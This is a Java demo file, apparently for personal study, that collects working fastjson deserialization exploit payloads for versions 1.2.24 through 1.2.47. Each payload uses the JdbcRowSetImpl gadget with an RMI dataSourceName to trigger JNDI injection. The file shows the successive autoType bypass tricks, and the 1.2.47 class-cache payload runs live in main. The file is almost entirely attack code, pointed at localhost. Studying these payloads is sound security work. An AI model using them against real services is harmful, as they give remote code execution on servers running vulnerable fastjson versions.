package com.huangbo.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import lombok.Data;
import com.sun.rowset.JdbcRowSetImpl;

public class FastJsonDemo {
    public static void main(String[] args) {
//        // 1、这种调用方式不需要 hello 是public
//        String json = "{\"@type\": \"com.huangbo.fastjson.Hello\", \"hello\":\"hahaha\"}";
//        Object obj = JSON.parseObject(json);
//        System.out.println(obj);

//        //2、fastjson 1.2.24
//        //这种调用方式需要 hello 是public
//        String payload = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/hello\",\"autoCommit\":true}";
//        JSON.parse(payload);

//        // 3、fastjson 1.2.41
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true); // 必须开启才能调用
//        String payload = "{\"@type\": \"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/hello\",\"autoCommit\":true}";
//        JSON.parse(payload);

//        // 4、fastjson 1.2.42
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true); // 必须开启才能调用
//        String payload = "{\"@type\": \"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://localhost:1099/hello\",\"autoCommit\":true}";
//        JSON.parse(payload);

//        // 5、fastjson 1.2.43
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true); // 必须开启才能调用
//        String payload = "{\"@type\": \"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"rmi://localhost:1099/hello\",\"autoCommit\":true]}";
//        JSON.parse(payload);

        // 6、fastjson 1.2.47
        String payload = "{" +
                "    \"a\":{" +
                "        \"@type\":\"java.lang.Class\"," +
                "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"" +
                "    }," +
                "    \"b\":{" +
                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "        \"dataSourceName\":\"rmi://localhost:1099/hello\"," +
                "        \"autoCommit\":true" +
                "    }" +
                "}";
        JSON.parse(payload);


    }

}
